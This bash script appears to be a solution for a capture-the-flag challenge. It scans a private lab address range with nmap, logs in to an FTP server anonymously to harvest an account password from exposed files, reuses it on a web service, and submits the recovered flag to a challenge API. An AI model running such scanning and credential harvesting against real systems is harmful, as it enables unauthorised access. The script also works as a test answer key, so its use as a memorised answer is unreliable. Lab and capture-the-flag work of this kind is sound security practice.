#!/usr/bin/env bash
set -euo pipefail

SCAN=$(nmap -n -p 21,8080 --open -oG - 172.20.0.141-199)
read -r FTP_HOST WEB_HOST < <(python3 - "$SCAN" <<'PY'
import re, sys
ftp = web = None
for line in sys.argv[1].splitlines():
    m = re.match(r"Host: ([0-9.]+).*Ports: (.*)", line)
    if not m:
        continue
    ports = m.group(2)
    if re.search(r"21/open", ports): ftp = m.group(1)
    if re.search(r"8080/open", ports): web = m.group(1)
if not ftp or not web:
    raise SystemExit("Could not identify both challenge services")
print(ftp, web)
PY
)
read -r LOGIN PASSWD < <(python3 - "$FTP_HOST" <<'PY'
from ftplib import FTP
import re, sys
ftp = FTP(sys.argv[1], timeout=5)
ftp.login()
files = ftp.nlst()
contents = []
for name in files:
    chunks = []
    try:
        ftp.retrbinary("RETR " + name, chunks.append)
        contents.append(b"".join(chunks).decode("utf-8", "replace"))
    except Exception:
        pass
ftp.quit()
text = "\n".join(contents)
user = re.search(r"Archive account:\s*(\S+)", text)
password = re.search(r"Password:\s*(\S+)", text)
if not user or not password:
    raise SystemExit("No archive credentials found in the exposed files")
print(user.group(1), password.group(1))
PY
)
RESPONSE=$(curl -fsS -u "$LOGIN:$PASSWD" "http://$WEB_HOST:8080/")
FLAG=$(python3 -c 'import re,sys; m=re.search(r"BSY\{[^}]+\}",sys.stdin.read()); print(m.group(0) if m else "")' <<< "$RESPONSE")
if [[ -z "$FLAG" ]]; then
  echo "Authenticated response did not contain a flag" >&2
  exit 1
fi
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"scl-challenge-frame-a7c033\",\"task_id\":\"task1\",\"flag\":\"$FLAG\"}"
